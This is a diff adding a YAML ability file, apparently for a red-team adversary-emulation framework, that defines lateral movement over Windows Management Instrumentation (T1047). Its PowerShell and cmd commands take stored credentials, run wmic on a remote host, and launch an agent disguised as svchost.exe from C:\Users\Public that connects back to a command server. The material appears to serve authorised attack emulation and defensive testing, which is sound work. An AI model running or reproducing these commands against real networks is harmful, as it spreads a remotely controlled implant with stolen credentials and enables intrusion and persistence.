@@ -1,0 +1,19 @@
+---
+
+- id: 2a32e46f-5346-45d3-9475-52b857c05342
+  name: Start 54ndc47 (WMI)
+  description: Remotely executes 54ndc47 over WMI
+  tactic: lateral-movement
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  platforms:
+    windows:
+      psh:
+        command: |
+          $split = "#{remote.host.credentials}".split(':')
+          wmic /node:$split[0] /user:$split[2] /password:$split[3] process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server} -executors psh";
+      cmd:
+        command: |
+          for /f "tokens=1-4 delims=: " %A in ("#{remote.host.credentials}") do @(set ip=%A && set port=%B && set user=%C && set pw=%D)
+          wmic /node:%ip% /user:%user% /password:%pw% process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executors cmd";
